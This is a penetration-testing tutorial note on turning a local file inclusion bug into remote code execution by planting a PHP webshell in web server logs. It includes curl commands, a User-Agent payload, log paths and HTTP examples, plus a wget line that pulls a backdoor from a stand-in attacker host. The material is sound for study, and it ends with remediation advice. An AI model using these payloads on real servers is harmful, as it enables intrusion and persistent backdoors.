---
tags: [vapt, lfi, rce, intermediate, log-poisoning]
difficulty: intermediate
module: "23 - Path Traversal and LFI/RFI"
topic: "23.07 LFI to RCE via Log Poisoning"
---

# 23.07 — LFI to RCE via Log Poisoning

## What is it?
Log Poisoning is the most reliable and classic method for escalating a Local File Inclusion (LFI) vulnerability into Remote Code Execution (RCE). 

When you have an LFI vulnerability, the server will blindly execute any file you point it to, as long as it contains valid PHP code. However, you might not have a File Upload feature to place your malicious PHP code on the server. To solve this, you can inject PHP code into a file that the server *automatically* writes to: its own log files.

Every time you visit a web server, it records your IP address, the URL you requested, and your `User-Agent` string into an access log (e.g., `/var/log/apache2/access.log`). If you change your `User-Agent` to `<?php system($_GET['cmd']); ?>`, the web server writes that literal PHP code into the log file. You then use your LFI vulnerability to `include()` the log file. The PHP engine parses the log, finds your injected PHP tags, and executes the command!

Think of it like a prankster at a guestbook. The prankster writes a magic spell in the guestbook. Later, they convince the host (who is under a curse that forces them to read everything out loud) to read the guestbook. The host reads the spell and unwittingly executes the magic.

## ASCII Diagram
```text
[Step 1: Poison the Log]
[Attacker] ──> GET / HTTP/1.1
               User-Agent: <?php system($_GET['cmd']); ?>
       │
       ▼
[Web Server (Apache/Nginx)]
       │
       ├─ Writes entry to: /var/log/apache2/access.log
       ├─ Log Entry: "10.0.0.5 - - [12/Oct] GET / <?php system($_GET['cmd']); ?>"
       │
[Step 2: Trigger the LFI]
[Attacker] ──> GET /index.php?page=../../../../var/log/apache2/access.log&cmd=id
       │
       ▼
[Vulnerable PHP App]
       │
       ├─ include("/var/log/apache2/access.log")
       ├─ PHP interpreter scans the log file text.
       ├─ Finds <?php system($_GET['cmd']); ?>
       ├─ Evaluates $_GET['cmd'] -> "id"
       │
[Execution] ──> Runs `id` command. Returns output to attacker!
```

## How to Find It
- **Manual steps:**
  1. Confirm you have an LFI vulnerability (e.g., you can read `/etc/passwd`).
  2. Attempt to read the server's access or error logs using the LFI payload. You need to know the default paths (see payloads below) and hope the web server user (`www-data`) has read permissions on those log files.
  3. If you can successfully see the raw access logs in your browser, the system is vulnerable to log poisoning.
  4. Intercept a normal request to the server in Burp Suite.
  5. Modify the `User-Agent` header to contain your PHP payload: `<?php echo "POISONED"; ?>` and send the request.
  6. Trigger the LFI to include the log file again. If you see the word "POISONED" in the output, you have RCE.

- **Tool commands with flags explained:**
  Automating log poisoning using `curl`:
  ```bash
  # Step 1: Poison the log via User-Agent
  curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
  
  # Step 2: Trigger LFI and execute command
  curl "http://target.com/index.php?page=../../../../var/log/apache2/access.log&cmd=whoami"
  ```

## How to Exploit It
- **Step-by-step walkthrough:**
  1. Map the underlying web server (Apache or Nginx) and OS (Debian/Ubuntu vs CentOS/RHEL) to guess the correct log path.
  2. Test reading the log file via LFI.
  3. Poison the log file by sending a request with a malicious `User-Agent`. (Do not use `<?php system('id'); ?>` immediately; use `<?php system($_GET['cmd']); ?>` so you only have to poison the log once and can pass different commands via the URL).
  4. Trigger the LFI, passing your desired command in the URL parameter.
  5. Extract the output from the massive log file response.

- **Actual payloads:**
  **Common Apache Log Paths:**
  ```text
  /var/log/apache2/access.log     (Ubuntu/Debian)
  /var/log/apache2/error.log      (Ubuntu/Debian)
  /var/log/httpd/access_log       (CentOS/RHEL)
  /var/log/httpd/error_log        (CentOS/RHEL)
  /usr/local/apache/logs/access_log
  /var/log/apache/access.log
  ```
  **Common Nginx Log Paths:**
  ```text
  /var/log/nginx/access.log
  /var/log/nginx/error.log
  ```
  **Poison Payload:**
  ```php
  User-Agent: <?php system($_GET['cmd']); ?>
  ```

- **Real HTTP request/response examples:**
  **Poisoning Request:**
  ```http
  GET / HTTP/1.1
  Host: target.com
  User-Agent: <?php system($_GET['c']); ?>
  ```
  **Execution Request:**
  ```http
  GET /index.php?page=../../../../var/log/apache2/access.log&c=whoami HTTP/1.1
  Host: target.com
  ```
  **Execution Response:**
  ```http
  HTTP/1.1 200 OK
  
  127.0.0.1 - - [10/Oct] "GET / HTTP/1.1" 200 - "Mozilla/5.0"
  127.0.0.1 - - [10/Oct] "GET / HTTP/1.1" 200 - "www-data
  "
  ```

## Real-World Example
During a penetration test on a legacy CMS, the tester discovered an LFI in the plugin loading mechanism (`?plugin=../../../../`). They could read `/etc/passwd` but couldn't upload files. They noticed the web server was Apache on Ubuntu. They checked `?plugin=../../../../var/log/apache2/access.log` and saw the logs. They used `curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com` to poison the log. Upon revisiting the LFI URL with `&cmd=ls -la`, the server executed the command. Because the logs get large and messy, the tester quickly used the webshell to establish a clean reverse shell back to their machine.

## How to Fix It
- **Developer remediation:**
  Fix the underlying LFI vulnerability by using an allowlist for file inclusions. 
  
  From a systems administration perspective, ensure that the web server user (`www-data`) does **not** have read access to the web server log files. By default on many modern Linux distributions, `/var/log/apache2/` is owned by `root` with `adm` group access, meaning `www-data` cannot read it. If permissions are set correctly (e.g., `chmod 640`), log poisoning fails.

- **Code snippet:**
  **Linux Terminal (Securing Log Permissions):**
  ```bash
  # Ensure the log directory is restricted
  chmod 750 /var/log/apache2
  
  # Ensure the log files are not readable by the web user
  chmod 640 /var/log/apache2/access.log
  chown root:adm /var/log/apache2/access.log
  ```

## Chaining Opportunities
- This vuln + [[02 - Unrestricted File Upload — Webshell Upload]] → If the log files are too large and parsing them times out the server, use log poisoning to execute a command that downloads a tiny, clean webshell into the web root (e.g., `cmd=wget http://attacker.com/shell.txt -O /var/www/html/shell.php`), giving you a permanent, clean backdoor.
- This vuln + [[Missing File Permissions / Sudo Privileges]] → Once the reverse shell is established via log poisoning, begin local privilege escalation to root.

## Related Notes
- [[05 - Local File Inclusion (LFI)]]
- [[08 - LFI to RCE via _proc_self_environ]]
- [[09 - LFI to RCE via PHP Session File]]
